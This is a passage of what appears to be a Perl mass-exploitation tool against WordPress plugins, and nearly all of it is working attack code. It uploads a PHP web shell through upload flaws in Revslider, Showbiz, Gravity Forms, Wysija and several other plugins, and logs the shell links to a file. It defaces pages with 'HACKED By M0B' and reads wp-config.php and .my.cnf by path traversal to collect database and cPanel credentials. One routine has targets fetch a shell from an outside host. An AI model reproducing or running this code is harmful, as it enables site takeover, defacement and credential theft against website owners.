if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/l.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/l.php?X=M0B";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Catpro";

print color('bold white'),"";
print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $catproup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$catproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Catpro";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}


################ Cherry Plugin #####################
sub cherry(){

my $url = "$site/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["l.php"],]);

$cherryup="$site/wp-content/plugins/cherry-plugin/admin/import-export/l.php?X=M0B";

my $checkcherry = $ua->get("$cherryup")->content;
if($checkcherry =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Cherry Plugin";

print color('bold white'),"";
print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cherryup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$cherryup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Cherry Plugin";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

################ Download Manager #####################
sub downloadsmanager(){
$downloadsmanager[VULN]="$site/wp-content/plugins/downloads-manager/readme.txt";
my $url = "$site";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [upfile => ["l.php"], dm_upload => '',]);
$dmup="$site/wp-content/plugins/downloads-manager/upload/l.php?X=M0B";
my $checkdm = $ua->get("$dmup")->content;
if($checkdm =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Download Manager";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $dmup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$dmup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Download Manager";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}


################ Power Zoomer #####################
sub powerzoomer(){ 
my $url = "$site/wp-admin/admin.php?page=powerzoomer_manage";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["l.php"], task => 'pwz_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/powerzoomer\/(.*?)\/big\/l.php/) {
$uploadfolder=$1;
$zoomerup="$site/wp-content/uploads/powerzoomer/$uploadfolder/big/l.php?X=M0B";
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Power Zoomer";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $zoomerup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$zoomerup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Power Zoomer";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

################ Gravity Forms #####################
sub gravityforms(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "form-data", Content => [file => ["l.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php.jd"]);

$gravityformsup = "$site/wp-includes/wp-footer.php?X=M0B";
my $check = $ua->get("$site/wp-content/uploads/_input_3_css.php.jd")->content;
my $checkk = $ua->get("$site/wp-includes/wp-footer.php")->content;
if($checkk =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $gravityformsup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$gravityformsup\n";
close (TEXT);
}
else{
gravityforms2();
}
}
################ Gravity Forms #####################
sub gravityforms2(){
my $url = "$site/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres2 = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["m.jpg"], form_id => '1', name => 'Psyco.html', gform_unique_id => '../../../../../', field_id => '3',]);
$gravityformsupp = "$site/_input_3_Psyco.html";
my $checkgravityformsupp = $ua->get("$gravityformsupp")->content;
if ($checkgravityformsupp =~ /HACKED By/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";

print color('bold green'),"[VULN]\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold red'),"Shell Not Uploaded\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold white'),"Index Uploaded Successfully\n";
print color('bold white'),"  [Link] => $gravityformsupp\n";
open (TEXT, '>>rez/index.txt');
print TEXT "$gravityformsupp\n";
close (TEXT);

}
else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Gravity Forms";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

################ Revslider upload shell #####################
sub revslider(){

my $url = "$site/wp-admin/admin-ajax.php";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $revslidres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["rev.zip"]]);

my $revs = $ua->get("$site/wp-content/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revavada = $ua->get("$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revstriking = $ua->get("$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revincredible = $ua->get("$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revultimatum = $ua->get("$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revmedicate = $ua->get("$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revcentum = $ua->get("$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revbeachapollo = $ua->get("$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revcuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revpindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revdesignplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revrarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;
my $revandre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B")->content;

if($revs =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revavada =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}


elsif($revstriking =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revincredible =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revmedicate =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site$site/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revultimatum =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revcentum =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/centum/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/themes/centum/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revbeachapollo =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revcuckootap =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revpindol =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revdesignplus =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revrarebird =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

elsif($revandre =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/l.php?X=M0B\n";
close (TEXT);
}

else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Upload Shell";
print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
revsliderajax();
}
}
################ Revslider ajax #####################
sub revsliderajax(){

my $url = "$site/wp-admin/admin-ajax.php";

my $revslidajaxres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_captions_css", data => "<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>HACKED By M0B"]);

$revsliderajax = $site . '/wp-admin/admin-ajax.php?action=revslider_ajax_action&client_action=get_captions_css';

my $checkrevsajax = $ua->get("$revsliderajax")->content;
if($checkrevsajax =~ /HACKED By/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Dafece Ajax";

print color('bold green'),"[VULN]";
print color('bold white'),"\n";
print color('bold green'),"  [";
print color('bold red'),"-";
print color('bold green'),"] ";
print color('bold white'),"Defaced Successfully\n";
print color('bold white'),"  [Link] => $revsliderajax\n";
open (TEXT, '>>rez/index.txt');
print TEXT "$revsliderajax\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Dafece Ajax";

print color('bold red'),"[FAILED]";
print color('bold white'),"\n";
}
}

sub getconfig{
$url = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";

$resp = $ua->request(HTTP::Request->new(GET => $url ));
$conttt = $resp->content;
if($conttt =~ m/DB_NAME/g){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get Config";

print color('bold green'),"[VULN]\n";
     open(save, '>>rez/Config.txt');   
    print save "[RevsliderConfig] $url\n";   
    close(save);
    getcpconfig();
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get Config";

print color('bold red'),"[FAILED]\n";
}
}

sub getcpconfig{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (10);
$cpup = "wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf";
$cpuplink = "$site/$cpup";
$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$cont = $resp->content;
if($cont =~ m/user=/g){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get cPanel";

print color('bold green'),"[VULN]\n";

$resp = $ua->request(HTTP::Request->new(GET => $cpuplink ));
$contt = $resp->content;
while($contt =~ m/user/g){
        if ($contt =~ /user=(.*)/){

print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"URL : $site/cpanel\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"USER : $1\n";
open (TEXT, '>>rez/cPanel.txt');
print TEXT "Url : $site\n";
print TEXT "USER : $1\n";
close (TEXT);
        }
        if ($contt =~ /password="(.*)"/){
            print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"PASS : $1\n";
open (TEXT, '>>rez/cPanel.txt');
print TEXT "PASS : $1\n";
close (TEXT);
        }


}
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Revslider Get cPanel";

print color('bold red'),"[FAILED]\n";
}
}

################ Showbiz #####################
sub showbiz(){
my $url = "$url/wp-admin/admin-ajax.php";
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $showbizres = $ua->post($url, Cookie => "", Content_Type => "form-data", Content => [action => "showbiz_ajax_action", client_action => "update_plugin", update_file => ["l.php"]]);

$showbizup = $site . '/wp-content/plugins/showbiz/temp/update_extract/l.php?X=M0B';

my $checkshow = $ua->get("$showbizup")->content;
if($checkshow =~ /M0B - Uname:/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Showbiz";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $showbizup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$showbizup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Showbiz";

print color('bold red'),"[FAILED]\n";
}
}

################ Simple Ads Manager #####################
sub ads(){  
my $url = "$site/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";

my $adsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["l.php"], action => 'upload_ad_image', path => '',]);
$adsup="$site/wp-content/plugins/simple-ads-manager/l.php?X=M0B";
if ($adsres->content =~ /{"status":"success"}/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Simple Ads Manager";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $adsup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$adsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Simple Ads Manager";

print color('bold red'),"[FAILED]\n";
}
}

################ Slide Show Pro #####################
sub slideshowpro(){ 
my $url = "$site/wp-admin/admin.php?page=slideshowpro_manage";

my $slideshowres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["l.php"], task => 'pro_add_new_album', album_name => '', album_desc => '',]);

if ($slideshowres->content =~ /\/uploads\/slideshowpro\/(.*?)\/big\/l.php/) {
$uploadfolder=$1;
$sspup="$site/wp-content/uploads/slideshowpro/$uploadfolder/big/l.php?X=M0B";

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Slide Show Pro";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $sspup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$sspup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Slide Show Pro";

print color('bold red'),"[FAILED]\n";
}
}

################################## WP Mobile Detector ########################################
##############################################################################################
# check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
##############################################################################################
sub wpmobiledetector(){ 
$wpmdshell = "http://testatranslations.com/shell/l.php";
$url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
$wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/l.php?X=M0B";

my $check = $ua->get("$url"); 

my $checkup = $ua->get("$wpmdup")->content; 
if($checkup =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Mobile Detector";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wpmdup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$wpmdup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"WP Mobile Detector";

print color('bold red'),"[FAILED]\n";
}
}

################ WYSIJA #####################
sub wysija(){
$theme = "my-theme";
my $url = "$site/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");


my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['go.zip', => 'go.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
$wysijaup = "$site/wp-content/uploads/wysija/themes/M0B/l.php?X=M0B";
my $checkwysija = $ua->get("$wysijaup")->content;
if($checkwysija =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wysija";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wysijaup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$wysijaup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Wysija";

print color('bold red'),"[FAILED]\n";
}
}

################ InBoundio Marketing #####################
sub inboundiomarketing(){ 
my $url = "$site/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php";
$inbomarketingup = "$site/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/l.php?X=M0B";
my $inbomarketingres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["l.php"],]);

$checkinbomarketing = $ua->get("$inbomarketingup")->content;
if($checkinbomarketing =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"InBoundio Marketing";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $inbomarketingup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$inbomarketingup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"InBoundio Marketing";

print color('bold red'),"[FAILED]\n";
}
}


################ dzs-zoomsounds #####################
sub dzszoomsounds(){ 
my $url = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload.php";
$dzsup = "$site/wp-content/plugins/dzs-zoomsounds/admin/upload/l.php?X=M0B";
my $dzsres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file_field => ["l.php"],]);

$checkdzsup = $ua->get("$dzsup")->content;
if($checkdzsup =~/M0B - Uname:/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"dzs-zoomsounds";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $dzsup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$dzsup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"dzs-zoomsounds";

print color('bold red'),"[FAILED]\n";
}
}

################ reflex-gallery #####################/
sub reflexgallery(){ 
my $url = "$site/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year=$year&Month=$month";
$reflexup = "$site/wp-content/uploads/$year/$month/l.php?X=M0B";
my $reflexres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["l.php"],]);

$checkreflexup = $ua->get("$reflexup")->content;
if($checkreflexup =~/M0B - Uname:/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Reflex Gallery";

print color('bold green'),"[VULN]\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $reflexup\n";
open (TEXT, '>>rez/Shells.txt');
print TEXT "$reflexup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Reflex Gallery";

print color('bold red'),"[FAILED]\n";
}
}


################ Creative Contact Form #####################
sub sexycontactform(){ 
my $url = "$site/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php";
